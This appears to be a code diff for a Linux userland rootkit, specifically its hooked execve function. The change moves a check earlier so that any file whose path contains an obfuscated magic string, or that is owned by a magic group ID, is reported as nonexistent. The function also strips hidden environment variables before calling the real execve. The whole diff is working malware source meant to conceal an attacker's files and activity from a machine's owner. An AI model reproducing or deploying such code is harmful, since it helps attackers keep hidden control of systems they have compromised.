@@ -160,9 +160,19 @@ int execve(const char *path, char *const argv[], char *const envp[])
 	#ifdef DEBUG
 	printf("[!] execve hooked\n"); 
 	#endif 
-
+	
 	if (owned()) return old_execve(path, argv, envp);
 	
+	char *magic = strdup(MAGIC); strxor(magic); 
+	struct stat filestat; 
+	old___xstat(_STAT_VER, path, &filestat);
+	if ((strstr(path, magic) != NULL) || (filestat.st_gid == MAGICGID))
+	{ 
+		CLEAN(magic); 
+		errno = ENOENT; 
+		return -1; 
+	}
+	CLEAN(magic); 
 	int i, j, x=-1;
 	for (i=0; envp[i]; i++)
 	{ 
@@ -189,18 +199,6 @@ int execve(const char *path, char *const argv[], char *const envp[])
 	}
 	hidden_env[i] = NULL; 
 	free(hidden_env[x]); 
-	free(hidden_env); 
-
-	char *magic = strdup(MAGIC); strxor(magic); 
-	struct stat filestat; 
-	old___xstat(_STAT_VER, path, &filestat);
-	if ((strstr(path, magic) != NULL) || (filestat.st_gid == MAGICGID))
-	{ 
-		CLEAN(magic); 
-		errno = ENOENT; 
-		return -1; 
-	}
-	CLEAN(magic); 
 	return old_execve(path, argv, hidden_env);
 } 
 
